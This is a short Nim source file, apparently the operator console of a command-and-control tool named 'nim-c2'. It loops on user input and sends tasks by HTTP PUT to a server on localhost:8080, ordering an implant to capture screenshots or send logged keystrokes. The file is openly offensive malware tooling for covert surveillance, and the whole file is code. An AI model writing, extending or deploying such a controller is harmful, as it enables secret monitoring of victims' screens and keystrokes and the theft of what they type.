import httpclient

var 
    current_command = ""
    client = newHttpClient()

proc PUT(cmd: string) = 
    var data = newMultipartData()
    data["data"] = cmd
    discard client.putContent("http://localhost:8080/", multipart=data)

proc process_command(cmd: string) =
    if cmd == "screen":
        echo "[*] Setting task to screenshot..."
        PUT("screenshot")   
    elif cmd == "log":
        echo "[*] Setting task to send keylogs..."
        PUT("log")
    else:
        echo "screen: take a screenshot"
        echo "log: get logged keys"
        

when isMainModule:
    while true:
        stdout.write "nim-c2 > "
        var cmd = stdin.readLine()
        process_command(cmd)